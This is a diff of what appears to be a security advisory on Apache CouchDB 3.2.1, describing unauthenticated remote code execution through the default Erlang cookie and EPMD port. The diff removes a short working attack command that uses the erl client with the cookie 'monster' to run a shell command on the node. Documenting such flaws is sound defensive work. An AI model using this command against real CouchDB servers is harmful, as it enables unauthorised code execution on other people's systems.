@@ -19,14 +19,6 @@ port, then send arbitrary Erlang Remote Procedure Calls to the running node.
 This gives unauthenticated remote code execution as the OS user running
 CouchDB — no HTTP credentials, no CouchDB account, no exploit chain required.
 
-A minimal attack using the `erl` client:
-
-```
-erl -name attacker@<host> -setcookie monster \
-    -eval 'rpc:call(couchdb@<host>, os, cmd, ["id"])' \
-    -noshell -s init stop
-```
-
 ## Affected Service
 - **Service:** Apache CouchDB 3.2.1
 - **Port:** 5984/TCP (HTTP API), 4369/TCP (EPMD)
